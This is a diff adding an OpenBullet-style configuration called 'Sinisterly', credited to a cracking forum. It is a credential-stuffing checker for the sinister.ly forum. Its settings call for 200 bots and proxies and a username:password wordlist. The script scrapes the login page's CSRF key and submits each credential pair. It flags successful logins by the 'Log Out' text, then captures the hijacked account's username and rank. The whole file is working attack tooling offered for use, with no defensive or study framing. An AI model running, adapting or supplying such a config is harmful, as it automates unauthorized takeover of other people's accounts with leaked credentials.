@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "Sinisterly",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-12T15:55:58.8738124+01:00",
+  "AdditionalInfo": "Check Out BreakingIn.To",
+  "Author": "NALON & SWAT - breakingin.to",
+  "Version": "1.1.5",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#IDK REQUEST GET "https://sinister.ly/member.php?action=login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://sinister.ly" 
+  HEADER "referer: https://sinister.ly/member.php" 
+
+#keysly PARSE "<SOURCE>" LR "name=\"my_post_key\" type=\"hidden\" value=\"" "\" />" -> VAR "keysly" 
+
+#LOGIN REQUEST POST "https://sinister.ly/member.php?action=login" 
+  CONTENT "username=<USER>&password=<PASS>&submit=Login&action=do_login&url=&my_post_key=<keysly>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://sinister.ly" 
+  HEADER "referer: https://sinister.ly/member.php" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Log Out" 
+  KEYCHAIN Failure OR 
+    KEY "You have entered an invalid username/password combination." 
+    KEY "If you have forgotten your password please retrieve a new one." 
+
+#UserReplace PARSE "<SOURCE>" LR "] [EXCLUSIVE] ...</strong></a>" "\"><span style=\"font" CreateEmpty=FALSE -> CAP "UserReplace" 
+
+#Username FUNCTION Replace "<br />by <a href=\"https://sinister.ly/User-" "" "<UserReplace>" -> CAP "Username" 
+
+#Go_to_user REQUEST GET "https://sinister.ly/User-<Username>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Rank PARSE "<SOURCE>" LR "profile_groupimage\"><img src=\"/images/groupimages/" ".png\"" CreateEmpty=FALSE -> CAP "Rank" 
+
